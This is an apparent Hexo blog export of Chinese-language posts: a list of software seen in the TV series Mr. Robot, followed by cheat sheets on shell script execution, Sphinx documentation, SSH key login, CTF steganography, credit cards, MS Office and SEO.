<h2 id="KVM-Kernel-base-Virtual-Machine"><a href="#KVM-Kernel-base-Virtual-Machine" class="headerlink" title="KVM(Kernel-base Virtual Machine)"></a><a href="http://www.linux-kvm.org/page/Main_Page">KVM(Kernel-base Virtual Machine)</a></h2><p>KVM是一个管理程序，它是一个可以通过虚拟机运行其他操作系统的软件。Elliot使用KVM在Kali Linux内虚拟化Windows 7。在第一季第8集中，它使用KVM运行DeepSound。</p>
<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a href="https://metasploit.com/">Metasploit</a></h2><p>Metasploit框架是Kali Linux中包含的一个软件，可以使渗透测试人员更容易发现网络中的漏洞。Meterpreter是可以在Metasploit框架中运行的数百个Payload之一，并且在第一季第6集中使用到。在第一季第6集中，Elliot使用Metasploit Framwork和Metapreter与btscanner和Bluesniff结合，通过MultiBlue蓝牙USB加密狗连接到附近警车中的电脑，并渗透进监狱的网络，以帮助一个名叫Vera的毒贩越狱。</p>
<h2 id="Framaroot"><a href="#Framaroot" class="headerlink" title="Framaroot"></a><a href="https://forum.xda-developers.com/apps/framaroot/root-framaroot-one-click-apk-to-root-t2130276">Framaroot</a></h2><p>在电视中称为RooterFrame的Framaroot，在第一季第3集中被Tyrell Wellick用来Root同事的Android手机，这样他就可以隐藏在手机上安装的FlexiSPY间谍软件，以便获得关于谁将成为E公司的下一任首席技术官的秘密信息。</p>
<h2 id="Kingo-Root"><a href="#Kingo-Root" class="headerlink" title="Kingo Root"></a><a href="https://zh.kingoapp.com/">Kingo Root</a></h2><p>Tyrell Wellick在第一季第3集中使用Kingo Root来Root同事的Android手机，这样他就可以在手机上隐蔽地安装FlexiSPY间谍软件，以便获得有关谁将成为下一任E公司首席执行官的秘密信息。</p>
<h2 id="FlexiSPY"><a href="#FlexiSPY" class="headerlink" title="FlexiSPY"></a><a href="https://www.flexispy.com/zh/">FlexiSPY</a></h2><p>FlexiSPY是针对Android，iOS和BlackBerry的间谍软件，允许用户监控受害者手机上的所有活动。在第一季第3集中，Tyrell Wellick秘密地将其安装在同事的Android手机上，以获取有关谁将成为下一任E公司首席技术官的秘密信息。</p>
<h2 id="SuperSU"><a href="#SuperSU" class="headerlink" title="SuperSU"></a><a href="http://www.supersu.com/">SuperSU</a></h2><p>SuperSU是一个在已Root的Android手机上管理超级用户权限的应用程序。在第一季第3集中，Tyrell Wellick在同事的Android手机上秘密安装了FlexiSPY —— 它使用SuperSU为它自己提供超级用户访问 —— 以便获得有关谁将成为下一任E公司首席技术官的秘密信息。</p>
<h2 id="can-utils"><a href="#can-utils" class="headerlink" title="can-utils"></a><a href="https://packages.debian.org/sid/can-utils">can-utils</a></h2><p>can-utils包含与汽车电脑有关的实用程序。其中一个工具被称为candump，它在《黑客军团》中被用于入侵汽车的电脑。</p>
<h2 id="radare"><a href="#radare" class="headerlink" title="radare"></a><a href="https://www.radare.org/r/">radare</a></h2><p>radare2是Tyrell Wellick在第二季第12集中使用的逆向工程框架。</p>
<h2 id="PyCharm"><a href="#PyCharm" class="headerlink" title="PyCharm"></a><a href="https://www.jetbrains.com/pycharm/">PyCharm</a></h2><p>PyCharm是一个Python和Django的IDE（集成开发环境），它是一种代码编辑软件。Trenton在第一季第四集中使用它。</p>
<h2 id="Tor"><a href="#Tor" class="headerlink" title="Tor"></a><a href="https://www.torproject.org/">Tor</a></h2><p>Tor被广泛认为是最好的匿名工具。它将使你的互联网活动难以被追踪，这个版本 —— 不像Tor浏览器 —— 可以用来托管隐藏服务，这是只能通过Tor访问的站点，并且其物理服务器位置被Tor匿名网络隐藏。Ray通过Tor隐藏服务运行着一条“丝绸之路”，他希望Elliot在第二季第5集中进行网站迁移。</p>
<h2 id="PuTTY"><a href="#PuTTY" class="headerlink" title="PuTTY"></a><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/">PuTTY</a></h2><p>PuTTY是用于连接到Linux服务器的客户端。Elliot在第二季第4集和第5集使用PuTTY连接到运行Kali Linux的VPS（虚拟专用服务器），以便他可以在Ray的计算机上使用安装在VPS上的IRC客户端与Darlene聊天。他还在第二季第5集中使用PuTTY，完成了Ray的“丝绸之路”网站的迁移。</p>
<h2 id="Mozilla-Firefox"><a href="#Mozilla-Firefox" class="headerlink" title="Mozilla Firefox"></a><a href="https://www.mozilla.org/zh-CN/firefox/">Mozilla Firefox</a></h2><p>Elliot使用Firefox作为他的默认浏览器。Trenton在第二季第8集中使用了Firefox。</p>
<h2 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a><a href="https://ffmpeg.org/">FFmpeg</a></h2><p>在第二季第8集中Trenton使用FFmpeg编码一个视频，其中包含一个泄露的关于进行非法大规模监视的FBI电话会议，并通过Tor浏览器向Vimeo上传。</p>
<h2 id="Slackware"><a href="#Slackware" class="headerlink" title="Slackware"></a><a href="http://www.slackware.com/">Slackware</a></h2><p>Slackware是1993年创建的一个Linux发行版，旨在提高设计的稳定性和简单性，并成为最“类Unix”的Linux发行版。Slackware最初是基于Softlanding Linux系统的，它已经成为许多其他Linux发行版的基础，尤其是SUSE Linux发行版的第一个版本，也是最早的发行版本。在第二季第10集中，当Elliot与黑暗军队达成拯救Darlene生命的交易时，Leon给了他一台安装有Slackware的笔记本电脑，用于将黑暗军队的项目移动到刚果。</p>
<h2 id="VLC-Media-Player"><a href="#VLC-Media-Player" class="headerlink" title="VLC Media Player"></a><a href="https://www.videolan.org/vlc/">VLC Media Player</a></h2><p>VLC媒体播放器被用于第二季第4集，当时Elliot和Darlene一起观看了虚假恐怖片《Careful Massacre of the Bourgeoisie》的VHS版本。VLC也被用于第二季第8集，当fsociety预览一个他们将上传的关于非法大规模监视的泄露的FBI电话会议视频时。</p>
<h2 id="Wayback-Machine"><a href="#Wayback-Machine" class="headerlink" title="Wayback Machine"></a><a href="http://web.archive.org/">Wayback Machine</a></h2><p>由Internet Archive运营的Waybach Machine是一个包含超过4,900亿个网页副本的数据库。在第二季第8集中FBI特工Dominique DiPierro向Mobley透露，联邦调查局使用了Wayback Machine，以便将他的黑客把柄与他为DJ Mobley创建的旧的粉丝页面联系起来。</p>
<h2 id="µTorrent"><a href="#µTorrent" class="headerlink" title="µTorrent"></a><a href="https://www.utorrent.com/intl/zh_cn/utweb-index">µTorrent</a></h2><p>第二季第4集达琳用μTorrent下载了虚假恐怖电影《Careful Massacre of the Bourgeoisie》的VHS版本。</p>
]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title>source、sh 与 ./</title>
    <url>/2018/05/09/source-sh/</url>
    <content><![CDATA[<h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p><code>source a.sh</code> 在当前 Shell 中执行 <code>a.sh</code>，<code>a.sh</code> 不需要有执行权限。<code>source</code> 也可以简写为 <code>.</code>，比如 <code>. a.sh</code>。</p>
<h2 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h2><p><code>sh a.sh</code> 打开一个子 Shell 去执行 <code>a.sh</code>，<code>a.sh</code> 不需要有执行权限。在子 Shell 里执行的 <code>a.sh</code> 里设置的变量，不会影响到父 Shell。类似的，<code>bash</code> 与 <code>sh</code> 同理。</p>
<h2 id=""><a href="#" class="headerlink" title="./"></a>./</h2><p><code>./a.sh</code> 打开一个子 Shell 去执行 <code>a.sh</code>，<code>a.sh</code> 需要有执行权限。注意，这里 <code>./</code> 与 <code>a.sh</code> 之间没有空格，换个角度看，其实没有使用任何命令，只是指定了当前文件夹下的这个文件而已。这就相当于双击这个文件去运行一样，那这个文件肯定要具有可执行权限。至于为什么要加 <code>./</code>，我猜想是为了预防与环境变量中相同的名称引起冲突。</p>
<p>前面采用了相对路径的方法，当然也可以采用绝对路径，比如 <code>/root/a.sh</code> 这样，同样可以执行。</p>
<p>另外，<code>./</code> 运行的文件里通常有 <strong>Shebang</strong> 一行，也就是以 <code>#!</code> 开头的第一行，用以指明执行这个脚本文件的解释程序。如果没有 Shebang 一行，那么以 <code>./a.sh</code> 运行脚本时，会自动使用环境变量中的 <code>$SHELL</code> 变量所指定的解释器来运行。</p>
<p>最后，在以 <code>sh a.sh</code> 或 <code>bash a.sh</code> 这样的命令运行脚本时，即使文件中指明了 Shebang，也会自动忽略，因为在命令中已经明确指定了所采用的解释器。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Sphinx 生成项目文档</title>
    <url>/2020/01/22/sphinx-document/</url>
    <content><![CDATA[<p><a href="http://www.sphinx-doc.org/en/master/">Sphinx</a> 是一个用 Python 编写的文档生成工具，其使用 <a href="https://howiezhao.github.io/2018/09/17/restructuredtext/">reStructuredText</a> 作为标记语言，目前广泛应用于 Python 相关项目的文档生成。比如 <a href="https://docs.python.org/zh-cn/3/">Python 官方文档</a>就是基于 Sphinx 生成的，此外 <a href="https://www.kernel.org/doc/html/latest/index.html">Linux 内核文档</a>的生成也于 2016 年从 <a href="http://www.doxygen.nl/">Doxygen</a> 转向 Sphinx，要了解更多使用 Sphinx 的项目可参考其<a href="https://www.sphinx-doc.org/en/master/examples.html">官方列表</a>。</p>
<a id="more"></a>

<p>使用 <code>pip install sphinx</code> 即可安装 Sphinx。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>按照最佳实践，项目文档一般是在项目的 <code>docs</code> 目录中，所以不妨先创建一个 <code>docs</code> 目录并进入，之后的一切有关 sphinx 的命令都在此目录中运行。</p>
<p>安装完 Sphinx 并进入 <code>docs</code> 目录后，输入 <code>sphinx-quickstart</code> 即可创建一个文档项目。该引导程序会询问你一些问题，并根据你给出的回答对生成的文档项目进行相关配置，当然，这些配置都可以在生成后的 <code>conf.py</code> 文件中进行重新设置。以下是它可能会问到的一些问题：</p>
<ul>
<li>分隔“source”和“build”目录（y/n）[n]：默认不分隔即可</li>
<li>项目名称：项目名称将显示在左侧导航栏顶部</li>
<li>作者姓名：作者姓名将显示在页面底部</li>
<li>项目版本：可不填</li>
<li>项目语言[en]：默认为英文，要切换为中文请输入 <code>zh_CN</code></li>
</ul>
<p>执行完成后，会在当前目录下生成如下文件/文件夹：</p>
<ul>
<li><code>_duild/</code>：存放构建之后的文件</li>
<li><code>_static/</code>：存放静态文件</li>
<li><code>_templates/</code>：存放模板文件</li>
<li><code>conf.py</code>：sphinx 的配置文件</li>
<li><code>index.rst</code>：文档主页</li>
<li><code>Makefile</code>：Linux 下 <code>make</code> 构建工具的配置文件</li>
<li><code>make.bat</code>：Windows 下的构建命令脚本</li>
</ul>
<p>编写完文档后，使用 <code>make html</code> 命令即可将其构建为 HTML 文件，其中，<code>html</code> 被称为构建器（builder），当然，你也可以使用别的构建器，比如 <code>latex</code>、<code>epub</code> 等。</p>
<p>输入 <code>make help</code> 可查看 make 支持的相关命令。</p>
<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>Sphinx 生成的 HTML 文件默认使用的主题为 <a href="https://github.com/bitprophet/alabaster">Alabaster</a>（个人觉得挺好看的，<a href="https://cn.python-requests.org/zh_CN/latest/">Requests</a> 和 <a href="https://flask.palletsprojects.com/en/1.1.x/">Flask</a> 项目文档的主题都是基于此主题修改的），除此之外，Sphinx 还内置了一些别的主题，具体可见其<a href="https://www.sphinx-doc.org/en/master/usage/theming.html#builtin-themes">官方文档中列出的</a>（个人觉得其余的主题不如 Alabaster 好看），当然，你也可以使用第三方主题。</p>
<p>第三方主题中最常见的非 <a href="https://github.com/readthedocs/sphinx_rtd_theme">sphinx_rtd_theme</a> 莫属，<a href="https://docs.scrapy.org/en/latest/">Scrapy</a> 项目的文档就使用的它，要使用 sphinx_rtd_theme，需要先执行 <code>pip install sphinx_rtd_theme</code> 命令下载它，然后修改 <code>conf.py</code> 配置文件中的 <code>html_theme</code> 变量为 <code>&#39;sphinx_rtd_theme&#39;</code> 并在 <code>extensions</code> 列表中添加 <code>&#39;sphinx_rtd_theme&#39;</code>。</p>
<p>要探索更多的第三方主题，可参考 <a href="https://sphinx-themes.org/">Sphinx Themes</a> 网站上收录的。</p>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>Sphinx 支持扩展，安装完 Sphinx 后就已经内置了一些扩展，除此之外，你也可以下载第三方扩展。</p>
<h3 id="内置扩展"><a href="#内置扩展" class="headerlink" title="内置扩展"></a>内置扩展</h3><h4 id="sphinx-ext-autodoc"><a href="#sphinx-ext-autodoc" class="headerlink" title="sphinx.ext.autodoc"></a>sphinx.ext.autodoc</h4><h4 id="sphinx-ext-coverage"><a href="#sphinx-ext-coverage" class="headerlink" title="sphinx.ext.coverage"></a>sphinx.ext.coverage</h4><h4 id="sphinx-ext-viewcode"><a href="#sphinx-ext-viewcode" class="headerlink" title="sphinx.ext.viewcode"></a>sphinx.ext.viewcode</h4><h4 id="sphinx-ext-napoleon"><a href="#sphinx-ext-napoleon" class="headerlink" title="sphinx.ext.napoleon"></a>sphinx.ext.napoleon</h4><h4 id="sphinx-ext-graphviz"><a href="#sphinx-ext-graphviz" class="headerlink" title="sphinx.ext.graphviz"></a>sphinx.ext.graphviz</h4><h4 id="sphinx-ext-todo"><a href="#sphinx-ext-todo" class="headerlink" title="sphinx.ext.todo"></a>sphinx.ext.todo</h4><h3 id="第三方扩展"><a href="#第三方扩展" class="headerlink" title="第三方扩展"></a>第三方扩展</h3><h4 id="recommonmark"><a href="#recommonmark" class="headerlink" title="recommonmark"></a>recommonmark</h4><h4 id="nbsphinx"><a href="#nbsphinx" class="headerlink" title="nbsphinx"></a>nbsphinx</h4><h4 id="sphinx-autodoc-typehints"><a href="#sphinx-autodoc-typehints" class="headerlink" title="sphinx-autodoc-typehints"></a>sphinx-autodoc-typehints</h4><h4 id="sphinx-gallery"><a href="#sphinx-gallery" class="headerlink" title="sphinx-gallery"></a>sphinx-gallery</h4><h2 id="Read-the-Docs"><a href="#Read-the-Docs" class="headerlink" title="Read the Docs"></a>Read the Docs</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>SSH协议分析</title>
    <url>/2018/08/24/ssh/</url>
    <content><![CDATA[<p>SSH(Secure Shell)即<strong>安全外壳协议</strong>，是一种位于应用层的加密的网络传输协议，虽然任何网络服务都可以通过SSH实现安全传输，但其最常见的用途还是远程登录，是Telnet等非安全Shell的替代品。</p>
<h2 id="OpenSSH的运行机制"><a href="#OpenSSH的运行机制" class="headerlink" title="OpenSSH的运行机制"></a>OpenSSH的运行机制</h2><p>SSH是一种协议，其实现多种多样，目前使用最广泛的实现是OpenSSH项目。当使用<code>ssh user@host</code>命令进行登录时，所完成的整个过程如下：</p>
<ol>
<li>远程主机收到用户的登录请求，把自己的公钥发给用户</li>
<li>用户使用这个公钥，将登录密码加密后，发送给远程主机</li>
<li>远程主机用自己的私钥，解密登录密码，若密码正确，则同意用户登录</li>
<li>后续过程中，用户发送的信息都采用此方式进行加密发送<a id="more"></a>
因为不像HTTPS协议，SSH协议的公钥是没有证书中心(CA)公证的，所以为了防止中间人攻击，当用户第一次登录远程主机时，系统会提示如下信息：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">The authenticity of host <span class="string">&#x27;host (12.18.429.21)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)?</span></span><br></pre></td></tr></table></figure>
即系统无法确认远程主机的真实性(远程主机有可能是中间人)，只知道远程主机的公钥指纹，询问用户是否继续连接。公钥指纹就是对公钥进行哈希计算得到的，为了方便用户的比较。用户并没有什么好的办法得知自己想要连接的真实远程主机的公钥指纹，一个可行的办法是远程主机在其官方网站上贴出自己的公钥指纹，方便用户和系统提示的指纹进行比较。</li>
</ol>
<p>假定当用户进行风险衡量后决定继续连接，接下来的过程就如上述提到的一样。远程主机的公钥会被保存在<code>$HOME/.ssh/known_hosts</code>文件中，当用户下次再连接时，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码。</p>
<p>除了采用口令登录外，还可使用<strong>公钥登录</strong>，原理为：用户将自己的公钥储存在远程主机上，登录时，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来，远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码。</p>
<p>OpenSSH提供了一个工具 —— <code>ssh-keygen</code>，使用它可以方便的生成一对公私钥，生成的公钥为<code>id_rsa.pub</code>，私钥为<code>id_rsa</code>，保存在<code>$HOME/.ssh</code>目录下，当然你可以使用<code>-t</code>（type）参数指定密钥的类型（默认生成类型为RSA），使用<code>-f</code>（file）参数指定生成的目录文件名，使用<code>-C</code>（Comment）参数指定注释，更多的参数可以使用<code>--help</code>参数查看。</p>
<p>生成的公钥格式为<code>&lt;protocol&gt; &lt;key-blob&gt; &lt;comment&gt;</code>，其中注释项通常用来指代要登录的用户名。</p>
<p>有了密钥对后，可以使用<code>ssh-copy-id user@host</code>命令将自己的公钥上传至远程主机，远程主机会将用户的公钥，保存在登录后的用户主目录的<code>$HOME/.ssh/authorized_keys</code>文件中。实际上，<code>ssh-copy-id</code>命令的整个过程就如下命令一样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh user@host <span class="string">&#x27;mkdir -p .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys&#x27;</span> &lt; ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
<p>实际上，<code>ssh-copy-id</code>还会对创建的文件及文件夹进行相关的权限设置，这里不过多介绍。</p>
<p>最后还要对远程主机的SSH服务端配置文件，即<code>/etc/ssh/sshd_config</code>文件进行相关配置，并重启SSH服务即可生效。具体而言，涉及到的配置项如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile .ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure>
<p>紧接着使用<code>service sshd restart</code>重启SSH服务。</p>
<h2 id="快速登录"><a href="#快速登录" class="headerlink" title="快速登录"></a>快速登录</h2><p><code>$HOME/.ssh</code>目录下的<code>config</code>文件可配置快速登录选项，若没有，可以新建一个，具体而言，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">host aliyun</span><br><span class="line">    user howie</span><br><span class="line">    hostname 192.168.0.41</span><br><span class="line">    port 22</span><br><span class="line">    identityfile ~&#x2F;.ssh&#x2F;id_rsa</span><br></pre></td></tr></table></figure>
<p>这代表当输入<code>ssh aliyun</code>时，其默认执行<code>ssh howie@192.168.0.41 -p 22 -i ~/.ssh/id_rsa</code>。当有多个别名需要设置时，其中间要空上一行。</p>
<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p>使用密钥连接后仍然需要输入登录密码：<br>这种情况一般是由于密钥登录失败所导致的，请检查<code>$HOME/.ssh</code>目录是否为700权限，<code>$HOME/.ssh/authorized_keys</code>文件是否为600权限，除此之外的其他权限均不能成功。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>隐写术</title>
    <url>/2018/09/22/steganography/</url>
    <content><![CDATA[<h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>拿到一个被隐写的文件，第一步当然是判断该文件是哪种类型的文件，一般可以通过文件后缀名判断之，若不能通过文件后缀名判断，则可以使用 Linux 中的 <code>file</code> 命令，直接输入 <code>file a</code> 即可检查 a 文件的类型。</p>
<p>知道文件类型后，就可以对症下药，依据相应的类型使用相应的办法，此时，不妨再查看一下文件对应的二进制数据，所有电子信息的本质无非是二进制，可以在二进制数据中搜索 <code>CTF</code> 或 <code>FLAG</code> 等关键字，发现是否存在隐藏信息。Windows 下可以使用 Sublime Text 3 的插件 <a href="http://facelessuser.github.io/HexViewer/">HexViewer</a> 查看二进制信息。Linux 下可以使用 <code>xxd</code> 命令查看文件二进制数据。</p>
<h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><h3 id="图片内容"><a href="#图片内容" class="headerlink" title="图片内容"></a>图片内容</h3><p>首先应该检查图片内容本身是否存在某些隐藏信息，遇到不熟悉的图片可以尝试<a href="https://www.google.com/imghp">谷歌搜图</a>，或许可以发现更多信息。</p>
<h3 id="Exif"><a href="#Exif" class="headerlink" title="Exif"></a>Exif</h3><p>Exif，即可交换图像文件格式（Exchangeable image file format），可以记录 JPEG 格式图片的属性信息和拍摄数据。有的 JPEG 格式图片会具有 Exif 信息，在 Windows 中查看属性选项卡中的详细信息项即可查看。别的格式的图片不具备 Exif 信息。如下图片：</p>
<p><img src="/images/meinv.jpg" alt="exif"></p>
<a id="more"></a>

<h3 id="JPEG"><a href="#JPEG" class="headerlink" title="JPEG"></a>JPEG</h3><h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h3><h3 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h3><h3 id="BMP"><a href="#BMP" class="headerlink" title="BMP"></a>BMP</h3><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><p>音频隐写一般会用到 <a href="http://www.petitcolas.net/steganography/mp3stego/">MP3stego</a>，该软件会将信息编码到 MP3 文件中，同时也可以从被隐写的 MP3 文件中解码所需信息。</p>
<p>下载该软件后在其 <code>MP3Stego</code> 文件夹下会有 2 个命令：<code>Encode</code> 和 <code>Decode</code>，<code>Encode</code> 命令用于隐写信息，<code>Decode</code> 命令用于解密被隐写的信息，使用 <code>decode -X -P pass svega_stego.mp3</code> 即可从 <code>svega_stego.mp3</code> 文件中解码所需信息，<code>-P</code> 指定解密密码。</p>
<h2 id="视频隐写"><a href="#视频隐写" class="headerlink" title="视频隐写"></a>视频隐写</h2><h2 id="其他隐写"><a href="#其他隐写" class="headerlink" title="其他隐写"></a>其他隐写</h2><h3 id="Word-文档"><a href="#Word-文档" class="headerlink" title="Word 文档"></a>Word 文档</h3><p>Word 文档可能会隐藏某些信息，遇到 <code>doc</code> 文档可以尝试在 <code>Word 选项</code>中选择<code>显示</code>并打开<code>隐藏文字</code>选项。如下所示：</p>
<p><img src="/images/word.PNG" alt="word"></p>
<p>像 Word 文档或 Excel 表格这样的富文本文件，可以直接解压之，查看其中是否包含某些特殊文件。</p>
<p>类似的题可以参考 <a href="http://www.shiyanbar.com/ctf/1927">Fonts</a>，<a href="http://www.shiyanbar.com/ctf/1849">认真你就输了</a>等等。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>说说信用卡</title>
    <url>/2019/01/08/talk-about-credit-card/</url>
    <content><![CDATA[<h2 id="年费"><a href="#年费" class="headerlink" title="年费"></a>年费</h2><p>所谓<strong>年费</strong>，即每年的管理费，几乎所有信用卡都有年费，年费一般可以通过两种方法免去，即<strong>刷够指定额度</strong>或<strong>刷够指定笔数</strong>，具体采用哪种方法依据特定的信用卡而定。有的信用卡是“<strong>终身免年费</strong>”的，这里的终身一般指信用卡的<strong>有效期</strong>内。</p>
<h2 id="有效期"><a href="#有效期" class="headerlink" title="有效期"></a>有效期</h2><p>为了保护信用卡的安全，信用卡是有有效期的，一般印在信用卡上的<strong>VALID THRU</strong>字段，比如05/26代表2026年5月过期，过期之后要重新去银行办理。</p>
<a id="more"></a>
<h2 id="等级"><a href="#等级" class="headerlink" title="等级"></a>等级</h2><p>信用卡的等级从低到高一般分为<strong>普卡</strong>、<strong>金卡</strong>（Gold）、<strong>白金卡</strong>（Platinum）等，等级越高，优惠越多，额度越大，但相应的，年费也会越高。</p>
<h2 id="溢缴款"><a href="#溢缴款" class="headerlink" title="溢缴款"></a>溢缴款</h2><p>信用卡不同于借记卡（或储蓄卡），信用卡的主要目的是用于消费，而不是存款，因此，存在信用卡里面的钱是没有利息的，这笔钱被叫做<strong>溢缴款</strong>，溢缴款取现是要收取手续费的。但在消费时，会优先扣除溢缴款，随后扣除额度。</p>
<h2 id="银行卡组织"><a href="#银行卡组织" class="headerlink" title="银行卡组织"></a>银行卡组织</h2><p>不同银行之间要实现互相转账就要靠<strong>银行卡组织</strong>的协调，在中国使用最多的卡组织是<strong>银联</strong>（UnionPay），在美国使用最多的卡组织是<strong>Visa</strong>，在欧洲使用最多的卡组织是<strong>MasterCard</strong>（万事达），在日本使用最多的卡组织是<strong>JCB</strong>。当你准备在海外购物时，就十分有必要办一张支持海外卡组织的信用卡，比如Visa信用卡。</p>
<h2 id="双标卡"><a href="#双标卡" class="headerlink" title="双标卡"></a>双标卡</h2><p>国内有一些信用卡上面既有银联的标志，也有海外卡组织的标志，这种卡就是<strong>双标卡</strong>。它可以在付款的时候选择指定的卡组织，比如在国内购物使用银联，在国外购物使用Visa。但是，按照国际惯例，一张卡只能归属于一个银行卡组织，这样看来，还是传统的两张单标卡更靠谱一点。</p>
<h2 id="信用卡安全码"><a href="#信用卡安全码" class="headerlink" title="信用卡安全码"></a>信用卡安全码</h2><p><strong>信用卡安全码</strong>常为3位数字，印在卡片背面卡号后四位处，Visa的安全码叫做<strong>CVV2</strong>（Card Verification Value 2），银联的安全码叫做CVN2（Card Validation Number 2），JCB的安全码叫做CAV2（Card Authentication Value 2）。安全码相当于信用卡的密码，常用于网络交易的过程中，所以，请保护好自己的安全码，不要被泄露。</p>
<h2 id="主卡副卡"><a href="#主卡副卡" class="headerlink" title="主卡副卡"></a>主卡副卡</h2><h2 id="币种"><a href="#币种" class="headerlink" title="币种"></a>币种</h2><h2 id="PayPal"><a href="#PayPal" class="headerlink" title="PayPal"></a>PayPal</h2><h2 id="借记卡和储蓄卡"><a href="#借记卡和储蓄卡" class="headerlink" title="借记卡和储蓄卡"></a>借记卡和储蓄卡</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>说说MS Office</title>
    <url>/2019/01/08/talk-about-ms-office/</url>
    <content><![CDATA[<p>Office是最常使用的<strong>办公套件</strong>，一般来说，提到Office，最先想到的是微软的Office，即<strong>MS Office</strong>，除此之外，还有<strong>WPS Office</strong>，这是由金山推出的。</p>
<p>Office原生支持Windows桌面版，这也是目前功能最全且<strong>收费</strong>的Office版本，时至今日，Office也可以用于UWP、Android、iOS、macOS以及Web等。一般来说，我们说的Office是指Windows桌面版的Office套件。</p>
<p>在本文写作之际，最新的Office版本为<strong>Office 2019</strong>，但据个人观察，<strong>Office 2010</strong>仍然被大多数人所使用。</p>
<a id="more"></a>
<p>Office套件一般包括以下软件：</p>
<ul>
<li><strong>Word</strong>：文档编辑工具</li>
<li><strong>Excel</strong>：表格编辑工具</li>
<li><strong>PowerPoint</strong>：幻灯片演示文稿制作工具</li>
<li><strong>Access</strong>：小型数据库</li>
<li><strong>OneNote</strong>：在线笔记应用</li>
<li><strong>Outlook</strong>：电子邮箱应用</li>
<li><strong>Publisher</strong>：桌面出版应用软件</li>
<li><strong>Visio</strong>：流程图制作工具</li>
</ul>
<p>以Office 2016为例，其中自带的OneNote全称为<strong>OneNote 2016</strong>（桌面版）；除此之外，还有Microsoft Store中<strong>UWP版</strong>的OneNote，即<strong>OneNote for Windows 10</strong>，简称为OneNote，此版本的OneNote是功能最全的OneNote，也是微软的主要开发版，并内置于所有的Windows 10电脑中，另外，Office 2019套件中也已替换成了此版本的OneNote。关于OneNote（OneNote for Windows 10）与OneNote 2016的详细区别请参考微软Office官方帮助信息：<a href="https://support.office.com/zh-cn/article/onenote-%E4%B8%8E-onenote-2016-%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F-a624e692-b78b-4c09-b07f-46181958118f">OneNote与OneNote 2016有什么区别？</a></p>
<h2 id="Office-365"><a href="#Office-365" class="headerlink" title="Office 365"></a>Office 365</h2><p>不同于Office 2016或Office 2019的一次性购买模式，<strong>Office 365</strong>采用订阅模式，即每月支付一定费用。它可以享受到更多的优惠，比如1TB的OneDrive空间和持续的软件更新等。具体可参考微软Office官方帮助信息：<a href="https://support.office.com/zh-cn/article/office-365-%E5%92%8C-office-2019-%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F-ed447ebf-6060-46f9-9e90-a239bd27eb96">Office 365和Office 2019之间的区别是什么？</a></p>
<h2 id="G-Suite"><a href="#G-Suite" class="headerlink" title="G Suite"></a>G Suite</h2><p><strong>G Suite</strong>是由Google公司推出的办公套件，其中主要包括<strong>Google Docs（文档）</strong>、<strong>Google Sheets（表格）</strong>、<strong>Google Slides（幻灯片）</strong>等，适用于Android、iOS、Web平台。这些软件兼容Office的文件格式。</p>
<h2 id="iWork"><a href="#iWork" class="headerlink" title="iWork"></a>iWork</h2><p><strong>iWork</strong>是由苹果公司推出的办公套件，其中主要包括<strong>Pages文稿</strong>、<strong>Numbers表格</strong>、<strong>Keynote讲演</strong>，适用于macOS、iOS平台。这些软件生成的文件格式与Office中的Word、Excel、PowerPoint互不兼容。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>谈谈SEO</title>
    <url>/2018/09/23/talk-about-seo/</url>
    <content><![CDATA[<p>SEO，即搜索引擎优化(Search Engine Optimization)，下面列出几点SEO方面的建议：</p>
<ul>
<li>页面的URL应该足够反映页面的内容</li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
